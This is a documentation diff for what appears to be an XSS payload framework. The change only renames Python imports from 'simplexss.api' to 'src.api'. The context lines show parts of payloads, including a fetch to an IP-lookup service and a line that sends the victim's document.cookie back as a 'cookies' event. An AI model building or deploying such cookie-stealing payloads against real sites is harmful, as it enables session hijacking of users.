@@ -32,7 +32,7 @@ Payloads have dependencies:
 Dependencies are accessible in payload after binding:
 
 ```python
-from simplexss.api import BasePayload
+from src.api import BasePayload
 
 
 class Payload(BasePayload):
@@ -109,7 +109,7 @@ class BaseIOManagerAPI(ABC):
 ```python
 # payload.py
 
-from simplexss.api import (
+from src.api import (
     BasePayload,
     BaseClient,
     BaseEvent,
@@ -151,7 +151,7 @@ fetch('https://api.ipify.org?format=json')
 ```python
 # payload.py
 
-from simplexss.api import (
+from src.api import (
     BasePayload,
     BaseClient,
     BaseEvent,
@@ -191,7 +191,7 @@ sendEvent('cookies', {'cookies': document.cookie})
 ```python
 # payload.py
 
-from simplexss.api import (
+from src.api import (
     BasePayload,
     BaseClient,
     BaseEvent,
